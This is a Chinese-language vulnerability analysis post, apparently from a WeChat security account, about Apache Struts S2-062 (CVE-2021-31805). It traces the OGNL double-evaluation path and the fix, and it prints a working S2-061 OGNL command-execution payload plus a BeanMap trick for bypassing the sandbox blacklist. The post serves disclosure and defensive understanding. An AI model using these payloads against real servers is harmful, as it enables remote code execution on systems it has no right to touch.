> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fEgn4Ci300_5bMpPzjVyUg)

 ![](http://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iav9PI8X1KIxVIl232DVogHGImIl7Iq4eS86fM7cibTN4zcRY4WVMfwIicw7gdA9car5BNrxliblCWu6w/0?wx_fmt=png) ** 且听安全 ** 聪者听于无形，明者见于未形；专注网络安全，关注漏洞态势；拒绝重复搬运，只做精品原创。 112篇原创内容   公众号

**漏洞信息**

  

近日Apache官方公布S2-062远程代码执行漏洞安全公告，漏洞编号为 CVE-2021-31805：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3DxibzxPcHKgEQ3VhicvIZ4bwljoXwNF5gvO6rQwwPp9HvsKhFmxiaMnsNQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

从通报来看，S2-062漏洞可以认为是S2-059和S2-061的延续，由于补丁修复不完整，导致仍然有标签可以实现二次OGNL表达式注入，漏洞影响版本为`Struts v2.0.0-v2.5.29`。

**S2-061补丁回顾  
**

  

S2-061漏洞触发点其实和S2-059是一样，都是针对标签属性`id`的二次OGNL表达式赋值，S2-059漏洞补丁（`Struts v2.5.22`版本）只对沙箱进行了增强，直到S2-061漏洞补丁（`Struts v2.5.26`版本）才对触发点`UIBean#setId`进行了修复，将OGNL表达式赋值过程`findString`改成了直接赋值：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3DoWqwvQEceTpAPlctjZvEhGElXqCthcAvh7rrMCGpFTyVZZ8pyeYHKw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

同时补丁对沙箱也进行了增强（`struts-default.xml`），黑名单中新增了Tomcat、JBoss、Weblogic等中间件的jar包：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3DJtCqDrJuqmknUWrFcpxhib0JqrNnlhw7UlJVWYXHuncsuxgR2zyia55g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**漏洞分析  
**

  

从漏洞描述来看，S2-062仍然是标签属性二次表达式注入漏洞。标签解析开始于`ComponentTagSupport#doStartTag`，结束于`ComponentTagSupport#doEndTag`：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3DWkETKnZ8qU0p13fgXnXNricaM479ya5bCoEuWWyLJBAViaZUdx8icJ7kw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

进入`UIBean#end`：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3DKNaQ2FOtze9I4czhWgA6cqd6lzIz9QLm3bF7kB1L9BM5PlRDn5BWPQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

进入`evaluateParams`函数，在第220行对属性`name`调用`findString`进行了一次OGNL表达式赋值（回顾Struts2历史漏洞）：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3Dp1DYj6Wx4S7fyIiazg2fOwAr7GOboxXZJEYhYfHNGvArMnIiciaSQaMlw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

将`name`赋值为我们提交的标签值。接着往下走，第340行判断便签属性不存在`value`且`name`非空时将进入`completeExpressionIfAltSyntax`函数：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3D0BPCzP5JCooGSnuvh2EJuXbX5JIjorPo3vfb8lWVUVcrIZEfDFcteg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3DFdmmTGgFGWMfIMhcfopIUa3tBU7tLaUCUII1SbLcOZJkI5XibbeNgGA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3D6ibmrq3lX4BBrUO4FiaKibRHPNibcouMPArX1n7KtR5bUXXPNhunyIYL0g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

当`name`赋值为类似`3*3`的格式时，变量`expr`就会变成`%{3*3}`，并通过`recursion`函数（输入参数为`name`）进行处理：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3DPicibw4gMlZWJAKT2AcB95nIAE8MMOYia1BVUaMXeibx5zYJxky6jc9kkw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

`recursion`返回`False`进入：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3DCAXziaupS87P0ic1ttoUfOvedbAp55nrAwVMNQwSLAFfFia2bqiauveAIg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

`findValue`函数完成第二次OGNL表达式赋值，从而触发表达式注入漏洞。我们可以构造如下表单：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3DnYeHrm2uiboV3QLiahuTONHo85I5gicdNz2qqOyHLh3VtjtyOPZjCBdaw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3DCicUQGUHlOfDjBJlHa8icSEZmz0OxL2xe2TL3MOKAMibzbibynYEEib1Z5A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**沙箱绕过  
**

  

上面已经实现了OGNL表达式注入，但是我们还需要绕过沙箱才能实现RCE。首先回顾S2-061实现命令执行方式：

  

```
`%{``(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +``(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +``(#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +``(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +``(#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +``(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +``(#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +``(#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +``(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'}))``}`
```

  

而`Struts v2.5.26`将`org.apache.tomcat.`加入了黑名单，所以无法获取`BeanMap`对象。参考OGNL语法：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3DQyTE6f7MpSOxuBXaB21JbDjta4dzBvDy8S8bXB7gjCPeYjUaz8mldw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

可以通过类似方式很容易获取`BeanMap`对象：

  

```
#@org.apache.commons.collections.BeanMap@{}
```

  

`org.apache.commons.collections.BeanMap`并不在黑名单中。可以替换payload绕过限制，从而实现RCE：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3Dp2T43Q7icGSbhkmYicvA6OHicVMPCZSTc35CUr5byFvlQJkaEQuYjuHFw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**修复方式  
**

  

新增了`NotExcludedAcceptedPatternsChecker`接口和`DefaultNotExcludedAcceptedPatternsChecker`子类：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3DxwpaJOtjibcG58AxTk3Pc7PVEog6My7asnd2gkuUk3gjKibLhb5JpPUw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3D8Qqc37AcweDuRRc0DcNPCngmChhogomQGs20bIo3aibLA8hGGKIN8ibg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

通过添加正则表达式规则来限制OGNL表达式赋值：

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iauTsSIHhDibHFOicqJtR0zu3DeHb728kRen1V1mbiaiaSX5FaMmKcf88Ee8G3GyAR3P1l3tvIpkNGvtGQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

**由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用本人负责，且听安全团队及文章作者不为此承担任何责任。**

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/wQ0FicTls5iav9PI8X1KIxVIl232DVogHGImIl7Iq4eS86fM7cibTN4zcRY4WVMfwIicw7gdA9car5BNrxliblCWu6w/0?wx_fmt=png) ** 且听安全 ** 聪者听于无形，明者见于未形；专注网络安全，关注漏洞态势；拒绝重复搬运，只做精品原创。 112篇原创内容   公众号

  

**点关注，不迷路！**

![图片](https://mmbiz.qpic.cn/mmbiz/wQ0FicTls5iauvNWYzVyySskMWrrukJ3ER3OicqVFzsnKuo3MCibiaribibztJne0Q4uuzw5LaGk6kLiaiciacXO1uTc8Hzg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)